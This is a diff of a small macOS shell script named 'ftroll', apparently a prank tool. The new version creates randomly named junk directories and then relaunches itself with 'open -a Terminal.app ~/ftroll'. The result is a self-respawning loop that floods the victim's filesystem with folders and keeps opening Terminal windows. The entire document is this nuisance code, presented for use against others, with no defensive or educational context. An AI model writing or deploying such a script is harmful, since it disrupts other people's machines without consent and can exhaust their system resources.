@@ -1,15 +1,6 @@
-# ftroll by SideWyndr and OHNX
+# ftroll by SideWyndr and ohnx
 # itrolledu.github.io
-mkdir huehuehuehue
-wait 3
-mkdir huehuehuehue
-./filetroll
-mkdir huehuehuehue
-wait 3
-mkdir huehuehuehue
-./filetroll
-mkdir huehuehuehue
-wait 3
-mkdir huehuehuehue
-./filetroll
-exit
+for d in */ ; do
+    mkdir huehuehuehue.$RANDOM.$RANDOM
+done
+open -a Terminal.app ~/ftroll
